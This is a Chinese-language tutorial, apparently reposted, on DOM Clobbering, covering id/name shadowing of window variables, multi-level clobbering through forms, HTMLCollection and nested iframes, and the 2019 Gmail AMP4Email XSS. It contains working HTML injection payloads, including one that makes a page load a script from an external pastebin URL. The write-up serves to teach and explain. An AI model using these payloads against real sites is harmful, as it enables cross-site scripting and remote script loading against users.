# 浅谈 DOM Clobbering 的原理及应用
假设你有一段程式码，有一个按钮以及一段 script，如下所示：  
``` 
 <!DOCTYPE html>
 <html>
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
 </head>

 <body>
   <button id="btn">click me</button>
   <script>
     // TODO: add click event listener to button
   </script>
 </body>
 </html>
```
尝试用 “最短的程式码”，实作出 “点下按钮时会跳出 alert (1)” 这个功能。  
``` 
document.getElementById('btn')
   .addEventListener('click', () => {
     alert(1)
   })
```
**DOM 与 window 的量子纠缠**  
DOM 裡面的东西，有可能影响到 window,比如在 HTML 里面设定一个有 id 的元素之后，在 JS 里面就可以直接存取到它：  
``` 
<button id="btn">click me</button>
 <script>
   console.log(window.btn) // <button id="btn">click me</button>
 </script>
```
因为 JS 的 scope，所以就算直接用 btn 也可以，因为当前的 scope 找不到就会往上找，一路找到 window。  
开头那题答案是：  
``` 
btn.onclick = () => alert(1)
```
不需要 getElementById，也不需要 querySelector，只要直接用跟 id 同名的变量去拿，就可以拿得到。  
除了 id 可以直接用 window 存取到以外，embed, form, img 跟 object 这四个 tag 用 name 也可以存取到：  
``` 
<embed name="a"></embed>
 <form name="b"></form>
 <img name="c" />
 <object name="d"></object>
```
而这个手法用在攻击上，就是标题的 DOM Clobbering。在 CS 领域中有覆盖的意思，就是透过 DOM 把一些东西覆盖掉以达成攻击的手段。  
**DOM Clobbering 入门**  
在什么场景之下有机会用 DOM Clobbering 攻击呢？必须有机会在页面上显示你自订的 HTML，否则就没有办法了。所以一个可以攻击的场景可能会像是这样：  
``` 
<!DOCTYPE html>
 <html>
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
 </head>
 <body>
   <h1>留言板</h1>
   <div>
     你的留言：哈囉大家好
   </div>
   <script>
     if (window.TEST_MODE) {
       // load test script
       var script = document.createElement('script')
       script.src = window.TEST_SCRIPT_SRC
       document.body.appendChild(script)
     }
   </script>
 </body>
 </html>
```
假设现在有一个留言板，你可以输入任意内容，但是你的输入在 server 端会透过 DOMPurify 来做处理，把任何可以执行 JavaScript 的东西给拿掉，所以 <script></script> 会被删掉，<img src=x onerror=alert(1)> 的 onerror 会被拿掉，还有许多 XSS payload 都没有办法过关。  
简而言之，没办法执行 JavaScript 来达成 XSS，因为这些都被过滤掉了。  
但是因为种种因素，并不会过滤掉 HTML 标籤，所以你可以做的事情是显示自订的 HTML。只要没有执行 JS，你想要插入什麽 HTML 标籤，设置什麽属性都可以。  
所以呢，你可以这样做：  
``` 
<!DOCTYPE html>
 <html>
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
 </head>
 <body>
   <h1>留言板</h1>
   <div>
     你的留言：<div id="TEST_MODE"></div>
     <a id="TEST_SCRIPT_SRC" href="my_evil_script"></a>
   </div>
   <script>
     if (window.TEST_MODE) {
       // load test script
       var script = document.createElement('script')
       script.src = window.TEST_SCRIPT_SRC
       document.body.appendChild(script)
     }
   </script>
 </body>
 </html>
```
根据我们上面所得到的知识，可以插入一个 id 是 TEST_MODE 的标籤 <div id="TEST_MODE"></div>，这样底下 JS 的 if (window.TEST_MODE) 就会过关，因为 indow.TEST_MODE 会是这个 div 元素。  
可以用 <a id="TEST_SCRIPT_SRC" href="my_evil_script"></a>，来让 window.TEST_SCRIPT_SRC 转成字串之后变成我们想要的字。  
在大多数的状况中，只是把一个变数覆盖成 HTML 元素是不够的，例如说你把上面那段程式码当中的 window.TEST_MODE 转成字串印出来：  
``` 
// <div id="TEST_MODE" />
 console.log(window.TEST_MODE + '')
```
结果会是：[object HTMLDivElement]。  
把一个 HTML 元素转成字串就是这样，会变成这种形式，如果是这样的话那基本上没办法利用。但幸好在 HTML 裡面有两个元素在 toString 的时候会做特殊处理：<base> 跟 <a>：  
这两个元素在 toString 的时候会回传 URL，而我们可以透过 href 属性来设置 URL，就可以让 toString 之后的内容可控。  
综合以上手法，学到了：  
- 用 HTML 搭配 id 属性影响 JS 变数
- 用 a 搭配 href 以及 id 让元素 toString 之后变成我们想要的值

透过上面这两个手法再搭配适合的场景，就有机会利用 DOM Clobbering 来做攻击。  
如果你想攻击的变数已经存在的话，你用 DOM 是覆盖不掉的，例如说：  
``` 
<!DOCTYPE html>
 <html>
 <head>
   <script>
     TEST_MODE = 1
   </script>
 </head>
 <body>
   <div id="TEST_MODE"></div>
   <script>
     console.log(window.TEST_MODE) // 1
   </script>
 </body>
 </html>
```
**多层级的 DOM Clobbering**  
用 DOM 把 window.TEST_MODE 盖掉，创造出未预期的行为。那如果要盖掉的对象是个物件，有机会吗？  
例如说 window.config.isTest，这样也可以用 DOM clobbering 盖掉吗？  
有几种方法可以盖掉，第一种是利用 HTML 标籤的层级关係，具有这样特性的是 form，表单这个元素  
以利用 form [name] 或是 form [id] 去拿它底下的元素，例如说：  
``` 
<!DOCTYPE html>
 <html>
 <body>
   <form id="config">
     <input name="isTest" />
     <button id="isProd"></button>
   </form>
   <script>
     console.log(config) // <form id="config">
     console.log(config.isTest) // <input name="isTest" />
     console.log(config.isProd) // <button id="isProd"></button>
   </script>
 </body>
 </html>
```
如此一来就可以构造出两层的 DOM clobbering。不过有一点要注意，那就是这边没有 a 可以用，所以 toString 之后都会变成没办法利用的形式。  
这边比较有可能利用的机会是，当你要覆盖的东西是用 value 存取的时候，例如说：config.enviroment.value，就可以利用 input 的 value 属性做覆盖：  
``` 
<!DOCTYPE html>
 <html>
 <body>
   <form id="config">
     <input name="enviroment" value="test" />
   </form>
   <script>
     console.log(config.enviroment.value) // test
   </script>
 </body>
 </html>
```
简单来说呢，就是只有那些内建的属性可以覆盖，其他是没有办法的。  
除了利用 HTML 本身的层级以外，还可以利用另外一个特性：HTMLCollection。  
如果要回传的东西有多个，就回传 HTMLCollection  
``` 
<!DOCTYPE html>
 <html>
 <body>
   <a id="config"></a>
   <a id="config"></a>
   <script>
     console.log(config) // HTMLCollection(2)
   </script>
 </body>
 </html>
```
那有了 HTMLCollection 之后可以做什麽呢？在 4.2.10.2. Interface HTMLCollection 中有写到，可以利用 name 或是 id 去拿 HTMLCollection 裡面的元素。  
像是这样：  
``` 
<!DOCTYPE html>
 <html>
 <body>
   <a id="config"></a>
   <a id="config" name="apiUrl" href="https://huli.tw"></a>
   <script>
     console.log(config.apiUrl + '')
     // https://huli.tw
   </script>
 </body>
 </html>
```
可以透过同名的 id 产生出 HTMLCollection，再用 name 来抓取 HTMLCollection 的特定元素，一样可以达到两层的效果。  
如果把 form 跟 HTMLCollection 结合在一起，就能够达成三层：  
``` 
<!DOCTYPE html>
 <html>
 <body>
   <form id="config"></form>
   <form id="config" name="prod">
     <input name="apiUrl" value="123" />
   </form>
   <script>
     console.log(config.prod.apiUrl.value) //123
   </script>
 </body>
 </html>
```
先利用同名的 id，让 config 可以拿到 HTMLCollection，再来用 config.prod 就可以拿到 HTMLCollection 中 name 是 prod 的元素，也就是那个 form，接著就是 form.apiUrl 拿到表单底下的 input，最后用 value 拿到裡面的属性。  
所以如果最后要拿的属性是 HTML 的属性，就可以四层，否则的话就只能三层。  
**再更多层级的 DOM Clobbering**  
根据 DOM Clobbering strikes back 裡面给的做法，有，利用 iframe 就可以达到！  
当你建了一个 iframe 并且给它一个 name 的时候，用这个 name 就可以指到 iframe 裡面的 window，所以可以像这样：  
``` 
<!DOCTYPE html>
 <html>
 <body>
   <iframe name="config" srcdoc='
     <a id="apiUrl"></a>
   '></iframe>
   <script>
     setTimeout(() => {
       console.log(config.apiUrl) // <a id="apiUrl"></a>
     }, 500)
   </script>
 </body>
 </html>
```
之所以会需要 setTimeout 是因为 iframe 并不是同步载入的，所以需要一些时间才能正确抓到 iframe 裡面的东西。  
有了 iframe 的帮助之后，就可以创造出更多层级：  
``` 
<!DOCTYPE html>
 <html>
 <body>
   <iframe name="moreLevel" srcdoc='
     <form id="config"></form>
     <form id="config" name="prod">
       <input name="apiUrl" value="123" />
     </form>
   '></iframe>
   <script>
     setTimeout(() => {
       console.log(moreLevel.config.prod.apiUrl.value) //123
     }, 500)
   </script>
 </body>
 </html>
```
理论上你可以在 iframe 裡面再用一个 iframe，就可以达成无限多层级的 DOM clobbering，可能有点编码的问题需要处理，例如说像是这样：  
``` 
<!DOCTYPE html>
 <html>
 <body>
   <iframe name="level1" srcdoc='
     <iframe name="level2" srcdoc="
       <iframe name="level3"></iframe>
     "></iframe>
   '></iframe>
   <script>
     setTimeout(() => {
       console.log(level1.level2.level3) // undefined
     }, 500)
   </script>
 </body>
 </html>
```
印出来会是 undefined，但如果把 level3 的那两个双引号拿掉，直接写成 name=level3 就可以成功印出东西来,但是再往下就出错了：  
``` 
<!DOCTYPE html>
 <html>
 <body>
   <iframe name="level1" srcdoc="
     <iframe name=&quot;level2&quot; srcdoc=&quot;
       <iframe name='level3' srcdoc='
         <iframe name=level4></iframe>
       '></iframe>
     &quot;></iframe>
   "></iframe>
   <script>
     setTimeout(() => {
       console.log(level1.level2.level3.level4)
     }, 500)
   </script>
 </body>
 </html>
```
用这样就可以无限多层了  
``` 
<iframe name=a srcdoc="
   <iframe name=b srcdoc=&quot
     <iframe name=c srcdoc=&amp;quot;
       <iframe name=d srcdoc=&amp;amp;quot;
         <iframe name=e srcdoc=&amp;amp;amp;quot;
           <iframe name=f srcdoc=&amp;amp;amp;amp;quot;
             <div id=g>123</div>
           &amp;amp;amp;amp;quot;></iframe>
         &amp;amp;amp;quot;></iframe>
       &amp;amp;quot;></iframe>
     &amp;quot;></iframe>
   &quot></iframe>
 "></iframe>
```
**实际案例研究：Gmail AMP4Email XSS**  
在 2019 年的时候 Gmail 有一个漏洞就是透过 DOM clobbering 来攻击的，简单来说呢，在 Gmail 裡面你可以使用部分 AMP 的功能，然后 Google 针对这个格式的 validator 很严谨，所以没有办法透过一般的方法 XSS。  
但是有人发现可以在 HTML 元素上面设置 id，又发现当他设置了一个 <a id="AMP_MODE"> 之后，console 突然出现一个载入 script 的错误，而且网址中的其中一段是 undefined。仔细去研究程式码之后，有一段程式码大概是这样的：  
``` 
var script = window.document.createElement("script");
 script.async = false;

 var loc;
 if (AMP_MODE.test && window.testLocation) {
     loc = window.testLocation
 } else {
     loc = window.location;
 }

 if (AMP_MODE.localDev) {
     loc = loc.protocol + "//" + loc.host + "/dist"
 } else {
     loc = "https://cdn.ampproject.org";
 }

 var singlePass = AMP_MODE.singlePassType ? AMP_MODE.singlePassType + "/" : "";
 b.src = loc + "/rtv/" + AMP_MODE.rtvVersion; + "/" + singlePass + "v0/" + pluginName + ".js";

 document.head.appendChild(b);
```
如果我们能让 AMP_MODE.test 跟 AMP_MODE.localDev 都是 truthy 的话，再搭配设置 window.testLocation，就能够载入任意的 script！  
所以 exploit 会长的像这样：  
``` 
// 让 AMP_MODE.test 跟 AMP_MODE.localDev 有东西
 <a id="AMP_MODE" name="localDev"></a>
 <a id="AMP_MODE" name="test"></a>

 // 设置 testLocation.protocol
 <a id="testLocation"></a>
 <a id="testLocation" name="protocol" href="https://pastebin.com/raw/0tn8z0rG#"></a>
```

原文:  
[浅谈 DOM Clobbering 的原理及应用](https://mp.weixin.qq.com/s/3a8tNwfbSTU8b_d12Wqn5A)
